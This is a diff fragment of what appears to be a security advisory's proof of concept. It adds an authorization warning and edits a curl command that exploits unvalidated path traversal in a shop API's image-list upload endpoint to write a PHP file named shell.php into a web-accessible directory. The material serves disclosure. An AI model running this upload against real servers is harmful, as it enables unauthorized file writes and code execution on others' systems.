@@ -10,13 +10,15 @@ Because `{relativePath}` is captured with `.+` and never validated, an authentic
 
 ### Proof of Concept
 
+> Use the following example only in fully authorized security testing. Running it without permission can break systems and may be illegal.
+
 1. Upload a PHP file outside the image directory using path traversal:
 
 ```bash
 curl -X POST \
   -H 'Authorization: Bearer <token>' \
   --data '<?php echo "pwned"; ?>' \
-  http://<shop-host>/api.php/v3/image-lists/1/images/../../../../shell.php
+  http://<shop-host>/api.php/v3/image-lists/1/images/../../shell.php
 ```
 
 This writes to `<web-root>/images/shell.php` (web-accessible).
